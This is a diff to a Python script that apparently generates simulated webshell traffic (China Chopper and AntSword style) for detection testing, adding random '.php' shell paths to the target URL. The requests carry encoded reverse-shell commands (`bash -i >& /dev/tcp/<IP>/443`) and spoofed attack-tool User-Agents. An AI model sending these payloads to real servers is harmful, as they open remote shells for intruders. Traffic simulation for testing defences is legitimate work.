@@ -65,10 +65,12 @@ def webshell_useing(url='http://127.0.0.1/'):
     chopper_mock(url)
     raw_mock(url)
 def chopper_mock(url):
+    url += shellpaths[random.randint(1, 5)] + gen_str() + ".php"
     requests.post(url,data=chopper[1].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
     requests.post(url,data=chopper[2].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
     requests.post(url,data=chopper[3].replace("pass",gen_str())+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
 def raw_mock(url):
+    url += shellpaths[random.randint(1, 5)] + gen_str() + ".php"
     requests.post(url,data=raw[random.randint(1, 5)].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
     requests.post(url,data=raw[random.randint(1, 5)].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': 'antSword/v2.0','Content-Type':'application/x-www-form-urlencoded'}))
     requests.post(url,data=gen_str()+'='+parse.quote(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode()), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
